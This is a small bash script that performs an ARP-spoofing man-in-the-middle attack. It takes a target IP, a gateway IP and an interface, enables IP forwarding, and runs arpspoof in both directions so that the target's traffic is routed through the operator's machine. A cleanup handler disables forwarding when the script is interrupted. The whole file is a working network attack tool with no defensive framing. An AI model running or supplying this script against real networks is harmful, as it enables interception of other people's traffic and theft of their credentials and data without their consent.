#!/bin/bash
# arp spoof - redirect traffic through this machine
# requires root and ip forwarding

if [ "$EUID" -ne 0 ]; then
    echo "run as root"
    exit 1
fi

show_usage() {
    echo "usage: ./spoof.sh <target_ip> <gateway_ip> <interface>"
}

target="$1"
gateway="$2"
iface="$3"

if [ -z "$target" ] || [ -z "$gateway" ] || [ -z "$iface" ]; then
    show_usage
    exit 1
fi

if ! command -v arpspoof &>/dev/null; then
    echo "arpspoof not found (install dsniff)"
    exit 1
fi

echo "enabling ip forwarding..."
echo 1 > /proc/sys/net/ipv4/ip_forward

echo "spoofing $target <-> $gateway on $iface"
echo "ctrl+c to stop"

cleanup() {
    echo ""
    echo "restoring..."
    echo 0 > /proc/sys/net/ipv4/ip_forward
    echo "ip forwarding disabled"
    exit 0
}

trap cleanup INT

arpspoof -i "$iface" -t "$target" "$gateway" &>/dev/null &
pid1=$!
arpspoof -i "$iface" -t "$gateway" "$target" &>/dev/null &
pid2=$!

wait $pid1 $pid2
